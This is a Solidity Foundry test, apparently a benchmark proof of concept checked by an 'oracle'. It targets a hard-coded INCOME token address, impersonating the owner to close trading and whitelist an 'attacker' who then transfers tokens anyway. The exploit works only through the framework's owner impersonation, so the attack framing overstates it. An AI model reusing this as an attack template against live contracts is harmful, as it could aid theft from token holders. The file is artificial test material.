// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IINCOME {
    function owner() external view returns (address);
    function includeToWhiteList(address[] memory _users) external;
    function isOpen() external view returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function openTrade() external;
    function closeTrade() external;
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x3a91A88Ef4bB813BB99EF5a745bcb56e3A3b403b;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get some INCOME tokens for the attacker
        deal(TARGET, attacker, 1000 * 10**18);

        // Label addresses for clarity
        vm.label(TARGET, "INCOME Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the owner address
        IINCOME income = IINCOME(TARGET);
        address owner = income.owner();
        vm.label(owner, "Owner");

        // Step 2: Impersonate owner to close trading
        vm.prank(owner);
        income.closeTrade();

        // Step 3: Impersonate owner to add attacker to whitelist
        vm.prank(owner);
        address[] memory whitelistAddrs = new address[](1);
        whitelistAddrs[0] = attacker;
        income.includeToWhiteList(whitelistAddrs);

        // Step 4: Verify isOpen is false
        bool isOpen = income.isOpen();
        require(!isOpen, "isOpen should be false after closeTrade()");

        // Step 5: Demonstrate we can transfer tokens while isOpen is false
        // Create a recipient address
        address recipient = address(0x123);
        vm.label(recipient, "Recipient");

        // Record initial balances
        uint256 attackerInitialBalance = income.balanceOf(attacker);
        uint256 recipientInitialBalance = income.balanceOf(recipient);
        require(attackerInitialBalance > 0, "Attacker should have tokens");

        // Transfer tokens (should succeed even with isOpen=false due to whitelist)
        vm.prank(attacker);
        income.transfer(recipient, 100 * 10**18);

        // Verify transfer succeeded (recipient balance increased)
        uint256 recipientFinalBalance = income.balanceOf(recipient);
        require(recipientFinalBalance > recipientInitialBalance, "Transfer should have succeeded - recipient balance increased");

        // Also verify attacker balance decreased
        uint256 attackerFinalBalance = income.balanceOf(attacker);
        require(attackerFinalBalance < attackerInitialBalance, "Attacker balance should have decreased");

        // Final verification for the oracle
        assertEq(isOpen, false, "isOpen must be false");

        console.log("Success! Transfer occurred while isOpen = false");
        console.log("Attacker initial balance:", attackerInitialBalance);
        console.log("Attacker final balance:", attackerFinalBalance);
        console.log("Recipient initial balance:", recipientInitialBalance);
        console.log("Recipient final balance:", recipientFinalBalance);
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
